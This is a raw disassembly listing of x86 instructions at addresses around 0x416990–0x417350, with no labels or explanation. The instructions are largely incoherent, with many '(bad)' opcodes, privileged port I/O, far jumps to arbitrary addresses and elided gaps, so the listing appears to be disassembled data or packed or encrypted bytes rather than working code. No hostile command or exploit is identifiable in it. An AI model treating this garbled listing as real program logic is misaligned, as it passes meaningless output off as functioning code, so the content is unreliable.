  416990:	dec    DWORD PTR [ebp+0x8]
  416993:	mov    bl,0x9d
  416995:	(bad)  
  416996:	(bad)  
  416998:	xchg   edi,eax
  416999:	dec    edx
  41699a:	add    eax,0x7335732d
  41699f:	sbb    BYTE PTR [edi],bl
  4169a1:	xchg   esi,eax
  4169a2:	jge    0x416992
  4169a4:	mov    BYTE PTR [esi+0x49],dl
  4169a7:	pop    ss
  4169a8:	in     al,0xc
  4169aa:	mov    ah,0x17
  4169ac:	fucomi st,st(6)
  4169ae:	imul   eax,DWORD PTR [eax+0x72a9a14c],0xfffffff3
  4169b5:	add    DWORD PTR [esp+ebx*4+0x62de2be7],ebx
  4169bc:	cli    
  4169bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169be:	lock and eax,0xaa7539cd
  4169c4:	sar    ebp,cl
  4169c6:	repz dec ebp
  4169c8:	es xor edx,ecx
  4169cb:	(bad)  
  4169cc:	adc    ax,0x4dd4
  4169d0:	push   eax
  4169d1:	icebp  
  4169d2:	mov    dl,BYTE PTR [ebp+0x7a]
  4169d5:	ja     0x416a2f
  4169d7:	jnp    0x4169ac
  4169d9:	jmp    0x4169d0
  4169db:	fwait
  4169dc:	stos   BYTE PTR es:[edi],al
  4169dd:	jns    0x4169b0
  4169df:	fsubr  DWORD PTR [edi-0x5]
  4169e2:	cmp    al,0x1b
  4169e4:	int3   
  4169e5:	lock xchg ecx,eax
  4169e7:	ds push edx
  4169e9:	sti    
  4169ea:	cmp    bh,BYTE PTR [edx+0x4d92349b]
  4169f0:	xchg   ebp,eax
  4169f1:	push   0x3f
  4169f3:	sti    
  4169f4:	dec    esp
  4169f5:	retf   
  4169f6:	aas    
  4169f7:	jno    0x41697b
  4169f9:	pop    edi
  4169fa:	mov    ecx,0xd6e1271b
  4169ff:	stos   BYTE PTR es:[edi],al
  416a00:	mov    DWORD PTR [edx+0x2d],ecx
  416a03:	jle    0x4169a7
  416a05:	cmp    BYTE PTR [esi+0x18],0xfd
  416a09:	jnp    0x416a15
  416a0b:	adc    edi,DWORD PTR [esi+edx*4-0x56]
  416a0f:	sub    al,0x3a
  416a11:	lock sar DWORD PTR [esi-0x46],0xd2
  416a16:	fucompp 
  416a18:	jno    0x416a59
  416a1a:	inc    ebx
  416a1b:	cld    
  416a1c:	ja     0x4169ab
  416a1e:	ss or  al,dl
  416a21:	push   edi
  416a22:	loop   0x416a22
  416a24:	mov    eax,ds:0x61370cbd
  416a29:	ins    DWORD PTR es:[edi],dx
  416a2a:	lods   al,BYTE PTR ds:[esi]
  416a2b:	mov    bl,0x1c
  416a2d:	mov    edi,0xee730fbf
  416a32:	in     eax,0xc4
  416a34:	mov    edi,0xc7385b64
  416a39:	lea    esp,[eax]
  416a3b:	lahf   
  416a3c:	ins    DWORD PTR es:[edi],dx
  416a3d:	pushf  
  416a3e:	cli    
  416a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a40:	sub    cl,0x93
  416a43:	inc    ecx
  416a44:	loopne 0x416a5d
  416a46:	xchg   esi,eax
  416a47:	sbb    al,0xc
  416a49:	ficomp DWORD PTR [ebp-0x3]
  416a4c:	inc    edx
  416a4d:	gs pop ebp
  416a4f:	ins    BYTE PTR es:[edi],dx
  416a50:	dec    esi
  416a51:	push   esi
  416a52:	stc    
  416a53:	dec    ecx
  416a54:	jae    0x416a3f
  416a56:	fst    DWORD PTR [edx+0x0]
  416a59:	lea    esi,[esi+0x56359a8e]
  416a5f:	xchg   ebx,eax
  416a60:	cmc    
  416a61:	iret   
  416a62:	xor    al,dh
  416a64:	jnp    0x416a5a
  416a66:	fs sbb al,0x36
  416a69:	mov    ebx,0xadc590
	...
  416ad6:	retf   
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0xaffc0ba3
  416ae4:	lods   al,BYTE PTR ds:[esi]
  416ae5:	popf   
  416ae6:	dec    edx
  416ae7:	hlt    
  416ae8:	add    BYTE PTR [eax],al
  416aea:	inc    DWORD PTR [eax]
  416aec:	add    BYTE PTR [eax],al
  416aee:	adc    eax,0xbed21e4b
  416af3:	scas   al,BYTE PTR es:[edi]
  416af4:	scas   al,BYTE PTR es:[edi]
  416af5:	mov    edi,0xdd063525
  416afa:	jo     0x416aa1
  416afc:	imul   eax,DWORD PTR [eax+0x5eed1edb],0xffffff93
  416b03:	push   cs
  416b04:	scas   al,BYTE PTR es:[edi]
  416b05:	fistp  DWORD PTR [esi+0x5a]
  416b08:	and    al,0x9c
  416b0a:	pop    edi
  416b0b:	fistp  DWORD PTR [edi]
  416b0d:	test   eax,0x77244184
  416b12:	xchg   dl,cl
  416b14:	scas   al,BYTE PTR es:[edi]
  416b15:	icebp  
  416b16:	mov    ecx,0x5a5b4025
  416b1b:	cmp    al,0xd7
  416b1d:	(bad)  
  416b1f:	es pop esp
  416b21:	scas   eax,DWORD PTR es:[edi]
  416b22:	iret   
  416b23:	add    bh,BYTE PTR [ebx+0x59]
  416b26:	jmp    DWORD PTR [ebx+0x35]
  416b29:	mov    dl,0xb7
  416b2b:	or     cl,BYTE PTR [ebx-0x4144fe5a]
  416b31:	pop    edx
  416b32:	clc    
  416b33:	pushf  
  416b34:	jg     0x416baf
  416b36:	add    dh,BYTE PTR ds:0x49b2928e
  416b3c:	pop    ss
  416b3d:	lock xchg edx,eax
  416b3f:	shr    BYTE PTR [esi+0x69],1
  416b42:	(bad)  
  416b43:	fiadd  DWORD PTR [edx+ecx*2+0x3e5b5ad3]
  416b4a:	or     dl,BYTE PTR [ebx-0x5897b020]
  416b50:	mov    bl,0x5d
  416b52:	sub    eax,0x59495e59
  416b57:	and    DWORD PTR [ebx],0x46a59ce8
  416b5d:	inc    ebp
  416b5e:	dec    eax
  416b5f:	jg     0x416b86
  416b61:	outs   dx,DWORD PTR ds:[esi]
  416b62:	mov    cl,0xe
  416b64:	fs aaa 
  416b66:	mov    ds:0x8c2a8868,al
  416b6b:	je     0x416bc7
  416b6d:	or     ah,al
  416b6f:	imul   esp,ebp,0xfffffff5
  416b72:	sub    eax,0xd7fef937
  416b77:	je     0x416afd
  416b79:	popa   
  416b7a:	cmovno edx,esp
  416b7d:	bound  ebp,QWORD PTR [eax+edx*1-0x55a2e467]
  416b84:	pop    ebp
  416b85:	jl     0x416b95
  416b87:	fisub  DWORD PTR [ebp+0x3b0658a]
  416b8d:	mov    WORD PTR [esi+0x2c],?
  416b90:	inc    ebp
  416b91:	mov    dh,0xce
  416b93:	imul   ebx,DWORD PTR [eax+0x25e90434],0x482d3c8b
  416b9d:	iret   
  416b9e:	hlt    
  416b9f:	out    dx,al
  416ba0:	add    al,0x98
  416ba2:	fwait
  416ba3:	div    DWORD PTR [eax]
  416ba5:	out    dx,eax
  416ba6:	xchg   edi,eax
  416ba7:	add    DWORD PTR [ecx+0x5c9fd242],0x78
  416bae:	(bad)  
  416bb0:	push   esi
  416bb1:	jecxz  0x416c28
  416bb3:	adc    DWORD PTR [esi+0x75],ebp
  416bb6:	xlat   BYTE PTR ds:[ebx]
  416bb7:	dec    ecx
  416bb8:	jns    0x416b6b
  416bba:	inc    ecx
  416bbb:	inc    ebx
  416bbc:	fisubr DWORD PTR [eax]
  416bbe:	sti    
  416bbf:	loope  0x416c3c
  416bc1:	sar    BYTE PTR [edx+0x23519aa5],cl
  416bc7:	out    0x55,eax
  416bc9:	and    bh,BYTE PTR [ebp+edx*4-0x78]
  416bcd:	lock jecxz 0x416b81
  416bd0:	dec    esp
  416bd1:	pushf  
  416bd2:	push   edx
  416bd3:	xchg   DWORD PTR [edx],eax
  416bd5:	mov    edx,0x5cd63994
  416bda:	repnz loopne 0x416b8b
  416bdd:	add    al,0xee
  416bdf:	imul   ebx,DWORD PTR [ebx],0x3022bdf2
  416be5:	sub    DWORD PTR [edx],esp
  416be7:	adc    al,0x3a
  416be9:	adc    eax,0x8dbd23
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0x545b70a9
  416c63:	out    dx,al
  416c64:	daa    
  416c65:	stc    
  416c66:	dec    ecx
  416c67:	cmc    
  416c68:	add    BYTE PTR [eax],al
  416c6a:	inc    DWORD PTR [eax]
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	aad    0x5a
  416c70:	mov    esi,0x87691c9d
  416c75:	add    al,0x1a
  416c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c78:	adc    al,0xca
  416c7a:	ss jmp 0x416c3d
  416c7d:	pushf  
  416c7e:	inc    ebp
  416c7f:	js     0x416c3b
  416c81:	gs cmp bh,al
  416c84:	and    ch,BYTE PTR [eax-0x33b233c6]
  416c8a:	push   0x3
  416c8c:	outs   dx,DWORD PTR ds:[esi]
  416c8d:	fist   DWORD PTR [eax-0x2a732af6]
  416c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c94:	fsubr  QWORD PTR [ecx-0x68776fc9]
  416c9a:	dec    ecx
  416c9b:	pusha  
  416c9c:	ret    
  416c9d:	and    DWORD PTR [ebp+0x34],ebx
  416ca0:	dec    ecx
  416ca1:	jb     0x416c64
  416ca3:	mov    cl,0xde
  416ca5:	jnp    0x416d17
  416ca7:	jne    0x416c39
  416ca9:	xchg   edi,eax
  416caa:	jno    0x416c48
  416cac:	cmp    eax,0x7477b973
  416cb1:	or     DWORD PTR [ebp+0x51],eax
  416cb4:	jmp    0x416d07
  416cb6:	(bad)  
  416cb7:	ss xor al,0xc7
  416cba:	ins    DWORD PTR es:[edi],dx
  416cbb:	std    
  416cbc:	or     DWORD PTR [ecx+0x52e50e2c],ecx
  416cc2:	fld    DWORD PTR [ebx-0x58]
  416cc5:	add    eax,0x3489cc51
  416cca:	mov    eax,ds:0xa72db155
  416ccf:	leavew 
  416cd1:	call   0xf56f9285
  416cd6:	(bad)  
  416cd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cd8:	outs   dx,DWORD PTR ds:[esi]
  416cd9:	fistp  DWORD PTR [ebp+0x5166839]
  416cdf:	and    BYTE PTR [esi+0x5a],bh
  416ce2:	add    al,0xc
  416ce4:	xor    al,0xd9
  416ce6:	mov    dh,0xe8
  416ce8:	sahf   
  416ce9:	int    0x67
  416ceb:	inc    edi
  416cec:	jg     0x416ca4
  416cee:	push   eax
  416cef:	ins    DWORD PTR es:[edi],dx
  416cf0:	fwait
  416cf1:	cdq    
  416cf2:	and    ebx,esi
  416cf4:	add    dh,ch
  416cf6:	sub    edx,eax
  416cf8:	test   BYTE PTR [ebx],dh
  416cfa:	sbb    DWORD PTR [ebx+0x64],esp
  416cfd:	sahf   
  416cfe:	xor    esp,DWORD PTR [edx+edx*4]
  416d01:	xchg   esp,eax
  416d02:	jo     0x416cb3
  416d04:	sub    DWORD PTR [esi-0x84b8980],ebx
  416d0a:	sbb    cl,BYTE PTR [esi]
  416d0c:	pop    ebp
  416d0d:	dec    ebp
  416d0e:	fisubr WORD PTR [edx]
  416d10:	add    al,0xdd
  416d12:	push   es
  416d13:	loop   0x416d76
  416d15:	in     eax,dx
  416d16:	out    dx,eax
  416d17:	inc    ecx
  416d18:	cld    
  416d19:	ror    BYTE PTR [edi+0x7f],1
  416d1c:	enter  0x22e6,0x4d
  416d20:	mov    al,0x57
  416d22:	jmp    0x9b05dfa3
  416d27:	xchg   edi,eax
  416d28:	mov    DWORD PTR [edx],edi
  416d2a:	and    ecx,ecx
  416d2c:	cdq    
  416d2d:	iret   
  416d2e:	outs   dx,DWORD PTR ds:[esi]
  416d2f:	inc    eax
  416d30:	mov    ch,0x96
  416d32:	repz pop ss
  416d34:	and    DWORD PTR [ebx-0x46],esp
  416d37:	sti    
  416d38:	(bad)  
  416d39:	lea    ebp,[esi+0x5127b51]
  416d3f:	sub    BYTE PTR [ecx],bl
  416d41:	scas   al,BYTE PTR es:[edi]
  416d42:	scas   al,BYTE PTR es:[edi]
  416d43:	push   es
  416d44:	xchg   ah,dl
  416d46:	xchg   edi,eax
  416d47:	loop   0x416cd5
  416d49:	cmp    eax,0x929e2949
  416d4e:	fldenv [eax+0x60]
  416d51:	sahf   
  416d52:	jb     0x416d9f
  416d54:	mov    ds:0x1496c33b,eax
  416d59:	(bad)  
  416d5a:	push   cs
  416d5b:	xlat   BYTE PTR ds:[ebx]
  416d5c:	sbb    edx,DWORD PTR [eax-0x2d]
  416d5f:	popa   
  416d60:	pop    esp
  416d61:	mov    WORD PTR [ecx],?
  416d63:	inc    ecx
  416d64:	stos   DWORD PTR es:[edi],eax
  416d65:	pushf  
  416d66:	fld    QWORD PTR [ebp+0x41]
  416d69:	into   
  416d6a:	dec    ebp
  416d6b:	arpl   WORD PTR [eax+eax*1+0x0],bx
	...
  416dd3:	add    BYTE PTR [eax],al
  416dd5:	add    BYTE PTR [ecx],ah
  416dd7:	xchg   ebx,eax
  416dd8:	mov    DWORD PTR [edi-0x60d84045],ebp
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	in     al,0x71
  416de4:	mov    ecx,0xf6481b
  416de9:	add    bh,bh
  416deb:	add    BYTE PTR [eax],al
  416ded:	add    BYTE PTR [ebx],ch
  416def:	pop    esp
  416df0:	retf   0xf388
  416df3:	arpl   WORD PTR [ebx],dx
  416df5:	dec    ebx
  416df6:	adc    DWORD PTR [eax+0x3c6aeefc],0xdb463257
  416e00:	jle    0x416e77
  416e02:	stos   DWORD PTR es:[edi],eax
  416e03:	and    esp,DWORD PTR [esi+esi*8-0x13b25207]
  416e0a:	iret   
  416e0b:	jl     0x416da7
  416e0d:	dec    esp
  416e0e:	sahf   
  416e0f:	jmp    0x416e5a
  416e11:	fdiv   DWORD PTR [ebx-0x1f]
  416e14:	jno    0x416dcc
  416e16:	je     0x416dc1
  416e18:	test   al,dl
  416e1a:	mov    ds:0x9a172ac0,eax
  416e1f:	push   esi
  416e20:	jl     0x416dd3
  416e22:	iret   
  416e23:	inc    ecx
  416e24:	outs   dx,BYTE PTR ds:[esi]
  416e25:	push   ebx
  416e26:	xor    DWORD PTR [esi+0x18ccee8c],esi
  416e2c:	adc    DWORD PTR [edi],eax
  416e2e:	sbb    ebp,ecx
  416e30:	mov    dh,BYTE PTR [eax+0x7c72bee5]
  416e36:	std    
  416e37:	pop    ds
  416e38:	fwait
  416e39:	and    BYTE PTR [ecx],0xc3
  416e3c:	ss pop edi
  416e3e:	aaa    
  416e3f:	adc    BYTE PTR [esi],0xf4
  416e42:	fld    DWORD PTR [ebx+0x2c4b28cc]
  416e48:	cmc    
  416e49:	pop    ebp
  416e4a:	loopne 0x416eac
  416e4c:	ffree  st(5)
  416e4e:	imul   ebp,esi,0xe5e7e5f3
  416e54:	fwait
  416e55:	mov    ch,0xab
  416e57:	retf   0xa5a9
  416e5a:	jmp    0xca49:0x59de12d2
  416e61:	mov    dh,0xb3
  416e63:	sub    al,ch
  416e65:	test   eax,0x8883001
  416e6a:	cmp    ecx,DWORD PTR [eax+0x11]
  416e6d:	pop    ebx
  416e6e:	mov    eax,ds:0x18daa517
  416e73:	std    
  416e74:	loope  0x416e82
  416e76:	mov    al,0x3f
  416e78:	or     ch,BYTE PTR [edx+0x16cc262a]
  416e7e:	jle    0x416ebd
  416e80:	inc    edx
  416e81:	in     al,0x6a
  416e83:	stc    
  416e84:	mov    edx,0xf00154ca
  416e89:	xlat   BYTE PTR ds:[ebx]
  416e8a:	dec    edx
  416e8b:	enter  0x77bb,0xd6
  416e8f:	mov    ebx,ecx
  416e91:	xchg   esi,eax
  416e92:	xchg   ecx,eax
  416e93:	mov    eax,ds:0x19841e9
  416e98:	leave  
  416e99:	out    0x2d,al
  416e9b:	sub    eax,0x749dcd6f
  416ea0:	imul   edx,DWORD PTR [esi-0x55],0x3d2f7858
  416ea7:	jno    0x416f26
  416ea9:	jb     0x416f04
  416eab:	arpl   WORD PTR [edi+edx*8-0x71],dx
  416eaf:	jnp    0x416e31
  416eb1:	add    eax,0x8fc8cf8b
  416eb6:	sar    DWORD PTR cs:[esi],0xe
  416eba:	mov    ecx,0x471fdf4a
  416ebf:	pop    esp
  416ec0:	sub    DWORD PTR [edi+0x29],0xffffffed
  416ec4:	mov    BYTE PTR [edx+ebx*2-0xb],bl
  416ec8:	mov    edx,ebp
  416eca:	stos   BYTE PTR es:[edi],al
  416ecb:	dec    eax
  416ecc:	add    cl,BYTE PTR es:[ebp+0x22]
  416ed0:	pop    esi
  416ed1:	in     eax,dx
  416ed2:	xchg   ebp,eax
  416ed3:	pop    edi
  416ed4:	mov    ebp,gs
  416ed6:	ja     0x416ea7
  416ed8:	jp     0x416ef5
  416eda:	outs   dx,BYTE PTR ds:[esi]
  416edb:	out    0x5d,eax
  416edd:	test   al,0x92
  416edf:	jns    0x416f2e
  416ee1:	mov    WORD PTR [ebx+0x49],?
  416ee4:	push   esp
  416ee5:	inc    esi
  416ee6:	push   es
  416ee7:	leave  
  416ee8:	stc    
  416ee9:	popa   
  416eea:	push   cs
  416eeb:	xchg   ecx,eax
  416eec:	outs   dx,DWORD PTR ds:[esi]
	...
  416f55:	add    BYTE PTR [edi-0x519271e7],bh
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0xb488eea
  416f64:	and    DWORD PTR [edi+eax*2],ebp
  416f67:	test   DWORD PTR [eax],0xff00
  416f6d:	add    BYTE PTR [eax+0x7d],al
  416f70:	std    
  416f71:	inc    eax
  416f72:	and    BYTE PTR [edi],dh
  416f74:	mov    cl,dh
  416f76:	jne    0x416f1c
  416f78:	or     esp,edi
  416f7a:	sti    
  416f7b:	out    0x2f,al
  416f7d:	or     ah,cl
  416f7f:	xchg   ecx,eax
  416f80:	inc    esp
  416f81:	xor    ebx,0xfffffff0
  416f84:	adc    al,0xf5
  416f86:	jp     0x416fea
  416f88:	mov    ebp,0x6a19c793
  416f8d:	test   al,0xcf
  416f8f:	adc    si,dx
  416f92:	sub    al,0xcd
  416f94:	in     al,0xd5
  416f96:	xor    DWORD PTR [ebx*4+0x40568f44],ecx
  416f9d:	(bad)  
  416f9e:	jl     0x416fa7
  416fa0:	aam    0xd6
  416fa2:	sbb    esp,DWORD PTR ds:0xcec32b05
  416fa8:	lods   al,BYTE PTR ds:[esi]
  416fa9:	test   BYTE PTR [eax],0xe3
  416fac:	jnp    0x416fe9
  416fae:	or     eax,0x10c67eb7
  416fb3:	retf   0xaa08
  416fb6:	xor    BYTE PTR [edx],dh
  416fb8:	mul    BYTE PTR [esi]
  416fba:	jne    0x416fe1
  416fbc:	push   ebx
  416fbd:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  416fbf:	jb     0x416ffa
  416fc1:	pop    edi
  416fc2:	rcl    DWORD PTR [edx],cl
  416fc4:	scas   al,BYTE PTR es:[edi]
  416fc5:	loopne 0x416ffd
  416fc7:	aaa    
  416fc8:	clc    
  416fc9:	int    0xf
  416fcb:	xor    DWORD PTR [eax-0x782911e7],edi
  416fd1:	dec    edx
  416fd2:	imul   esp,DWORD PTR [ebp+0x15],0x36
  416fd6:	jo     0x416f92
  416fd8:	cmp    BYTE PTR [esi],bh
  416fda:	outs   dx,DWORD PTR ds:[esi]
  416fdb:	cmp    BYTE PTR [esp+ebx*1],0xd7
  416fdf:	push   edi
  416fe0:	les    esp,FWORD PTR [esi+0x74d37dbb]
  416fe6:	jg     0x41704c
  416fe8:	add    eax,eax
  416fea:	sub    bl,BYTE PTR [edi-0x2f]
  416fed:	mov    edx,DWORD PTR [ebx-0x18]
  416ff0:	(bad)
  416ff4:	shl    ah,1
  416ff6:	jnp    0x416f9f
  416ff8:	in     eax,0xf1
  416ffa:	cmp    ecx,DWORD PTR [edi]
  416ffc:	js     0x417058
  416ffe:	inc    esp
  416fff:	mov    bl,0x93
  417001:	jp     0x417014
  417003:	jg     0x416fe3
  417005:	mov    edi,eax
  417007:	add    DWORD PTR [esp+eiz*4+0x222dd79f],ebp
  41700e:	sbb    BYTE PTR [eax],bl
  417010:	cmp    BYTE PTR [edi+ebp*8-0x1],ch
  417014:	ficomp DWORD PTR [edi]
  417016:	rol    BYTE PTR [ebx],cl
  417018:	lods   eax,DWORD PTR ds:[esi]
  417019:	sub    ebp,DWORD PTR [esi]
  41701b:	cs xchg edi,eax
  41701d:	call   0x261442bb
  417022:	call   0xa03d:0xa7411a13
  417029:	and    eax,0x98508aa6
  41702e:	sub    DWORD PTR [ebp+0x18ced5d],ebx
  417034:	sti    
  417035:	(bad)  
  417036:	popa   
  417037:	xlat   BYTE PTR ds:[ebx]
  417038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417039:	fldl2t 
  41703b:	mov    dl,0xe
  41703d:	fucomip st,st(4)
  41703f:	scas   al,BYTE PTR es:[edi]
  417040:	pop    es
  417041:	xor    ecx,esp
  417043:	jle    0x41701a
  417045:	sub    edx,edx
  417047:	enter  0x78e7,0x1c
  41704b:	stc    
  41704c:	jmp    0x417061
  41704e:	dec    ebx
  41704f:	stos   DWORD PTR es:[edi],eax
  417050:	popf   
  417051:	or     DWORD PTR [edi-0x42166865],esi
  417057:	mov    BYTE PTR [esi-0x24],dl
  41705a:	mov    edi,0xa4a00776
  41705f:	daa    
  417060:	lahf   
  417061:	loop   0x41708c
  417063:	jl     0x416ffd
  417065:	dec    esi
  417066:	push   cs
  417067:	sbb    dh,BYTE PTR [ecx]
  417069:	das    
  41706a:	clc    
  41706b:	dec    eax
  41706c:	mov    eax,0x0
	...
  4170d5:	add    BYTE PTR [esi+0x2d],dh
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    edx,edi
  4170e3:	sti    
  4170e4:	dec    esp
  4170e5:	mov    ch,0x46
  4170e7:	clc    
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	inc    DWORD PTR [eax]
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	lods   eax,DWORD PTR ds:[esi]
  4170ef:	pop    ds
  4170f0:	psadbw mm5,QWORD PTR [edx+0x3c0eefac]
  4170f7:	and    ch,BYTE PTR es:[esi+0x76]
  4170fb:	fnstcw WORD PTR [ebp-0x67a5b20f]
  417101:	jg     0x41717a
  417103:	lods   eax,DWORD PTR ds:[esi]
  417104:	shr    DWORD PTR [edx+esi*2-0x4c],0xd3
  417109:	gs jmp 0xac614a3a
  41710f:	add    al,bh
  417111:	dec    edx
  417112:	mov    al,0x5a
  417114:	mov    cl,0xc4
  417116:	push   eax
  417117:	les    ebx,FWORD PTR [ebx+0x5672e6e2]
  41711d:	ss mov ebx,0x4104b8cf
  417123:	stos   DWORD PTR es:[edi],eax
  417124:	xchg   edi,eax
  417125:	jmp    0x417147
  417127:	or     eax,esp
  417129:	mov    ebx,0x3832040
  41712e:	arpl   WORD PTR [ecx],si
  417130:	leave  
  417131:	sbb    esp,DWORD PTR [esi+0x5f885958]
  417137:	pop    ebx
  417138:	push   es
  417139:	add    BYTE PTR [ebp+edx*8-0x37],dh
  41713d:	ret    
  41713e:	mov    edx,0x83e0e522
  417143:	fist   WORD PTR [ecx]
  417145:	out    0x2c,eax
  417147:	jmp    0x7bb1:0x3db5b691
  41714e:	call   DWORD PTR [esi-0x14]
  417152:	cmp    eax,0x583f4c4c
  417157:	dec    edx
  417158:	cs mov ebp,0x553b9637
  41715e:	adc    al,0x8d
  417160:	test   BYTE PTR [edi+0x50ba56dc],bh
  417166:	and    eax,DWORD PTR [edx+0x79310e25]
  41716c:	pushf  
  41716d:	inc    eax
  41716e:	rcr    ecx,cl
  417170:	shl    DWORD PTR fs:[ebx],1
  417173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417174:	add    bl,bl
  417176:	test   eax,0xf07c9b35
  41717b:	sbb    esi,ebp
  41717d:	cmp    dl,al
  41717f:	xor    edi,esi
  417181:	sbb    al,0x65
  417183:	pushf  
  417184:	call   0xe859d0d1
  417189:	jge    0x417167
  41718b:	popw   es
  41718d:	loop   0x4171d3
  41718f:	jle    0x41720e
  417191:	push   ecx
  417192:	call   DWORD PTR [esi+0x2a]
  417195:	ins    BYTE PTR es:[edi],dx
  417196:	and    DWORD PTR [eax+eax*4+0x2b],ebx
  41719a:	pop    ds
  41719b:	repz sbb BYTE PTR [edi+esi*8],bh
  41719f:	inc    edi
  4171a0:	mov    ds:0x30fd0233,eax
  4171a5:	ins    BYTE PTR es:[edi],dx
  4171a6:	xor    BYTE PTR [edx],0x5
  4171a9:	jns    0x417209
  4171ab:	rol    bh,cl
  4171ad:	in     eax,0xe8
  4171af:	daa    
  4171b0:	clc    
  4171b1:	inc    eax
  4171b2:	pusha  
  4171b3:	popa   
  4171b4:	push   eax
  4171b5:	add    ecx,DWORD PTR [ebx-0x1]
  4171b8:	cmp    bh,cl
  4171ba:	adc    BYTE PTR ds:0xba93cfbe,bl
  4171c0:	mov    ds:0xfbdd3c41,eax
  4171c5:	stc    
  4171c6:	addr16 push cs
  4171c8:	fldenv [ebx-0x6c4a44a6]
  4171ce:	rcr    BYTE PTR [eax-0x15],0x74
  4171d2:	jo     0x41715b
  4171d4:	out    0xe5,al
  4171d6:	retf   
  4171d7:	push   cs
  4171d8:	call   0x4adc:0x6ce7e9b9
  4171df:	jle    0x4171a8
  4171e1:	(bad)  
  4171e2:	sti    
  4171e3:	inc    ecx
  4171e4:	lods   eax,DWORD PTR ds:[esi]
  4171e5:	(bad)  
  4171e6:	pop    edx
  4171e7:	jnp    0x4171f8
  4171e9:	int3   
  4171ea:	adc    edx,edx
  4171ec:	mov    ds:0x0,al
	...
  417255:	add    BYTE PTR [esi-0xe58fe7],ah
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	inc    ebx
  417263:	cld    
  417264:	xlat   BYTE PTR ds:[ebx]
  417265:	imul   eax,DWORD PTR [ebp-0x7],0xff0000
  41726c:	add    BYTE PTR [eax],al
  41726e:	push   edx
  41726f:	inc    ebx
  417270:	call   ecx
  417272:	icebp  
  417273:	inc    ecx
  417274:	push   ecx
  417275:	pop    esp
  417276:	or     edi,DWORD PTR ds:0x322b192a
  41727c:	push   esi
  41727d:	dec    esi
  41727e:	pop    esp
  41727f:	inc    edi
  417280:	inc    edx
  417281:	push   edi
  417282:	shr    BYTE PTR [esi],1
  417284:	or     DWORD PTR [ebx-0x61],edi
  417287:	inc    edi
  417288:	pusha  
  417289:	js     0x417223
  41728b:	(bad)  
  41728c:	(bad)  
  41728d:	in     eax,dx
  41728e:	(bad)  
  41728f:	js     0x4172f2
  417291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417292:	fcomp  st(6)
  417294:	mov    bh,0x6c
  417296:	out    0x15,al
  417298:	in     al,0x8e
  41729a:	in     al,0x67
  41729c:	mov    cs,WORD PTR [edi-0x4]
  41729f:	xchg   ebx,eax
  4172a0:	mov    ss,WORD PTR [esi-0x19]
  4172a3:	pop    eax
  4172a4:	mov    ecx,0x937b61da
  4172a9:	lods   al,BYTE PTR ds:[esi]
  4172aa:	and    DWORD PTR [edi-0x42],ecx
  4172ad:	adc    DWORD PTR [esi+0x64],edx
  4172b0:	aam    0x46
  4172b2:	and    dh,BYTE PTR [edx+0x5f7ed266]
  4172b8:	pop    esi
  4172b9:	or     dh,cl
  4172bb:	(bad)  
  4172bc:	sti    
  4172bd:	dec    ebp
  4172be:	cli    
  4172bf:	add    eax,0x5d597c74
  4172c4:	aad    0x1
  4172c6:	fsubr  DWORD PTR [eax+0xa20def5]
  4172cc:	popa   
  4172cd:	push   esi
  4172ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172d0:	std    
  4172d1:	sti    
  4172d2:	cmp    eax,0x5160dcdf
  4172d7:	and    eax,0x3928446d
  4172dc:	out    0xf7,al
  4172de:	dec    esi
  4172df:	push   edi
  4172e0:	icebp  
  4172e1:	or     ah,ah
  4172e3:	das    
  4172e4:	mov    BYTE PTR [eax-0x65487256],dl
  4172ea:	shl    DWORD PTR [ebx-0x1b],1
  4172ed:	shl    DWORD PTR [ecx-0x649e54a0],cl
  4172f3:	jae    0x417352
  4172f5:	cwde   
  4172f6:	call   0xc1f481ab
  4172fb:	jnp    0x41729b
  4172fd:	test   ecx,0xedb2065c
  417303:	pop    es
  417304:	and    esi,edi
  417306:	les    esi,FWORD PTR [eax]
  417308:	ins    BYTE PTR es:[edi],dx
  417309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41730a:	or     edx,0xace1fe70
  417310:	and    edx,ecx
  417312:	jge    0x417372
  417314:	mov    cl,0xdf
  417316:	loop   0x417365
  417318:	outs   dx,DWORD PTR ds:[esi]
  417319:	or     eax,0x1f39aeb0
  41731e:	mov    WORD PTR [edx-0x16],?
  417321:	lahf   
  417322:	ds xchg esp,ebx
  417325:	or     ebp,edi
  417327:	repnz clc 
  417329:	cmp    ecx,DWORD PTR [esi+edx*1]
  41732c:	in     eax,dx
  41732d:	cmp    BYTE PTR [esi],cl
  41732f:	retf   
  417330:	adc    al,0xe9
  417332:	es and al,0x2
  417335:	inc    bh
  417337:	mov    BYTE PTR ds:0x5cc26e6e,ah
  41733d:	fwait
  41733e:	loop   0x417323
  417340:	test   eax,0xd2ba7bd7
  417345:	mov    ds:0x1e942eaa,al
  41734a:	pop    ebp
  41734b:	ret    
  41734c:	arpl   dx,ax
  41734e:	ja     0x417390
  417350:	add    eax,0x3a5a672a
